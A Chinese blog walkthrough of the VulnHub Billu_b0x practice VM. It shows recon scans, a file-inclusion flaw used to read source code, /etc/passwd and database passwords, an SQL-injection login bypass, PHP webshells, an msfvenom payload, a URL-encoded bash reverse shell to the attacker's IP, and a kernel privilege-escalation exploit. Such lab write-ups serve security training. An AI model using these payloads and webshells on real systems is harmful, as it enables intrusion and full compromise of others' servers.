# 原创
：  VulnHub渗透测试实战靶场 - Billu_b0x

# VulnHub渗透测试实战靶场 - Billu_b0x

#### VulnHub渗透测试实战靶场 - Billu_b0x

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/billu/Billu_b0x.zip)


## Billu_b0x靶机搭建

> 
将下载好的靶机环境，用VMware导入，将靶机和攻击机的网络连接设置为`NAT`模式


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c0e6ce3308c24ddd87e4603197864729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9a6805519d6a4e79883a86c39e10082c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

## 渗透测试

### 信息搜集

> 
用Kali中的arp扫描探测一下：`sudo arp-scan -l`


> 
使用Nmap扫描VMware Network Adapter VMnet8网卡的NAT网段C段IP：`sudo nmap -sP 192.168.23.1/24`


> 
确定目标ip地址：`192.168.23.130`<br/> 用Nmap进行深度扫描：`sudo nmap -sS -A 192.168.23.130 -oN billu.txt`<br/> 发现目标开放了22端口和80端口


### 漏洞挖掘

> 
访问80端口进入web首页，发现用户名口令输入框，并提示"Show me your SQLI skills"


> 
漏洞挖掘思路：



> 
先用sqlmap进行测试：`sqlmap -u http://192.168.23.130/ --data "un=admin&amp;ps=admin&amp;login=let%27s+login" --level 3 --dbms mysql`，发现并没有什么效果


> 
使用dirsearch扫描一下网站目录：`python3 dirsearch.py -u 192.168.23.130 -e *.php`，发现存在挺多200的页面


> 
测试后发现在`http://192.168.23.130/test.php`存在文件包含


> 
利用该漏洞，查看一下之前探测网站目录得到的php文件内容



```
&lt;?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed -&gt;  " . mysqli_connect_error();
  }

?&gt;

```

> 



```
&lt;?php


echo '&lt;form  method="post" enctype="multipart/form-data"&gt;
    Select image to upload:
    &lt;input type="file" name=image&gt;
	&lt;input type=text name=name value="name"&gt;
	&lt;input type=text name=address value="address"&gt;
	&lt;input type=text name=id value=1337 &gt;
    &lt;input type="submit" value="upload" name="upload"&gt;
&lt;/form&gt;';



?&gt;

```

> 



```
&lt;?php
session_start();

include('c.php');
include('head.php');
if(@$_SESSION['logged']!=true)
{
	$_SESSION['logged']='';
	
}

if($_SESSION['logged']==true &amp;&amp;  $_SESSION['admin']!='')
{
	
	echo "you are logged in :)";
	header('Location: panel.php', true, 302);
}
else
{
echo '&lt;div align=center style="margin:30px 0px 0px 0px;"&gt;
&lt;font size=8 face="comic sans ms"&gt;--==[[ billu b0x ]]==--&lt;/font&gt; 
&lt;br&gt;&lt;br&gt;
Show me your SQLI skills &lt;br&gt;
&lt;form method=post&gt;
Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;
&lt;input type=submit name=login value="let\'s login"&gt;';
}
if(isset($_POST['login']))
{
	$uname=str_replace('\'','',urldecode($_POST['un']));
	$pass=str_replace('\'','',urldecode($_POST['ps']));
	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
	$result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) &gt; 0) {

$row = mysqli_fetch_assoc($result);
	   echo "You are allowed&lt;br&gt;";
	   $_SESSION['logged']=true;
	   $_SESSION['admin']=$row['username'];
	   
	 header('Location: panel.php', true, 302);
   
}
else
{
	echo "&lt;script&gt;alert('Try again');&lt;/script&gt;";
}
	
}
echo "&lt;font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\"&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; ";

?&gt;

```

> 



```
?php


function file_download($download)
{
	if(file_exists($download))
				{
					header("Content-Description: File Transfer"); 
					
					header('Content-Transfer-Encoding: binary');
					header('Expires: 0');
					header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
					header('Pragma: public');
					header('Accept-Ranges: bytes');
					header('Content-Disposition: attachment; filename="'.basename($download).'"'); 
					header('Content-Length: ' . filesize($download));
					header('Content-Type: application/octet-stream'); 
					ob_clean();
					flush();
					readfile ($download);
				}
				else
				{
				echo "file not found";	
				}
	
}

if(isset($_POST['file']))
{
file_download($_POST['file']);
}
else{

echo '\'file\' parameter is empty. Please provide file path in \'file\' parameter ';
}

```

> 



```
&lt;?php
session_start();

include('c.php');
include('head2.php');
if(@$_SESSION['logged']!=true )
{
		header('Location: index.php', true, 302);
		exit();
	
}



echo "Welcome to billu b0x ";
echo '&lt;form method=post style="margin: 10px 0px 10px 95%;"&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;';
if(isset($_POST['lg']))
{
	unset($_SESSION['logged']);
	unset($_SESSION['admin']);
	header('Location: index.php', true, 302);
}
echo '&lt;hr&gt;&lt;br&gt;';

echo '&lt;form method=post&gt;

&lt;select name=load&gt;
    &lt;option value="show"&gt;Show Users&lt;/option&gt;
	&lt;option value="add"&gt;Add User&lt;/option&gt;
&lt;/select&gt; 

 &amp;nbsp&lt;input type=submit name=continue value="continue"&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;';
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}


if(isset($_POST['upload']))
{
	
	$name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);
	
	if(!empty($_FILES['image']['name']))
	{
		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
	$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
	$image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME); 
	$filetype = @$finfo-&gt;file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
				{
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
							 {
							  echo "Uploaded successfully ";
							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
							 mysqli_query($conn, $update);
							  
							}
				}
			else
			{
				echo "&lt;br&gt;i told you dear, only png,jpg and gif file are allowed";
			}
	}
	else
	{
		echo "&lt;br&gt;only png,jpg and gif file are allowed";
		
	}
}


}

?&gt;

```

> 



```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash

```

> 
审计得到的有关信息可以发现：



> 
通过得到的mysql密码登录phpmyadmin，尝试后发现无法登录（原因在后面阐述）


> 
重装环境之后再次用之前得到的信息登录，在ica_lab数据库的auth表中，找到web登录的用户名：`biLLu`，密码：`hEx_it`


### getshell

#### 获得root权限

> 
继续暴破phpmy目录，文件包含phpmyadmin配置文件，由于phpmyadmin的默认的配置文件是`config.inc.php`，用之前文件包含的漏洞得到phpmyadmin的默认的配置文件的内容，得到用户为`root`，密码为`roottoor`


```
&lt;?php
/* Servers configuration */
$i = 0;

/* Server: localhost [1] */
$i++;
$cfg['Servers'][$i]['verbose'] = 'localhost';
$cfg['Servers'][$i]['host'] = 'localhost';
$cfg['Servers'][$i]['port'] = '';
$cfg['Servers'][$i]['socket'] = '';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['auth_type'] = 'cookie';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';
$cfg['Servers'][$i]['AllowNoPassword'] = true;

/* End of servers configuration */

$cfg['DefaultLang'] = 'en-utf-8';
$cfg['ServerDefault'] = 1;
$cfg['UploadDir'] = '';
$cfg['SaveDir'] = '';


/* rajk - for blobstreaming */
$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';
?&gt;

```

> 
用xshell登录，得到root权限<br/> 之前mysql登不上检测后发现mysql状态为：`mysql stop/waiting`，推测mysql被之前的高线程目录暴破、扫描导致故障


#### 获得非root权限

> 



> 



```
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));

```

> 
str_replace的作用是将字符串`\'` 替换为空，因此构造SQL注入登录payload时，必须含有`\'`字符串，否则会报错，urldecode的作用是将输入解码，所以可以用Payload：用户名密码均为`' or 1=1 -- \'`，成功登入web页面


> 
点击`add user`进入添加账号界面，这是一个图片上传漏洞点，利用图片上传和文件包含获得shell<br/> 查看之前利用文件包含漏洞获得的panel.php源码，发现panel.php存在本地文件包含漏洞


```
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}

```

> 
用msf制作一个php马用来反弹shell：`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.23.128 lport=1234 -f raw &gt; shell.php`<br/> 把得到的php文件附加在一张图片的最后制作一张图片马，然后将图片马上传


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cf5bde3ac68b4c209dbc14240f1c5560.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ed4367c991ac4337a9cc5861a0db6498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
msf起一个监听，利用burpsuite发包，成功获得反弹的shell，但是测试后发现输入的命令没有用（不知道为啥）


> 
重新上传一个马，这次采用一句话马：`&lt;?php system($_POST['cmd']);?&gt;`，安装上面的思路用burpsuite发包


> 
用bash反弹shell，将命令`echo "bash -i &gt;&amp; /dev/tcp/192.168.23.128/1234 0&gt;&amp;1" | bash`进行url编码`%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%33%2e%31%32%38%2f%31%32%33%34%20%30%3e%26%31%22%20%7c%20%62%61%73%68`，起一个监听，再次发包


### 提权

> 
将shell升级为 tty，得到一个交互式的shell：`python -c 'import pty;pty.spawn("/bin/bash")'`<br/> 查看系统内核版本：`uanme -a`和`cat /etc/issue`


> 
根据得到的内核相关信息，寻找可利用的exp：[https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)


> 
为了方便上传exp，在文件上传目录uploaded_images为写一个马：


```
echo '&lt;?php eval($_POST['d1no']);?&gt;' &gt;&gt; d1no.php

```

> 
利用蚁剑将exp上传上去，执行操作
- 赋予执行权限：chmod 777 37292.c- 编译exp：gcc 37292.c -o exp- 执行exp，提权至root

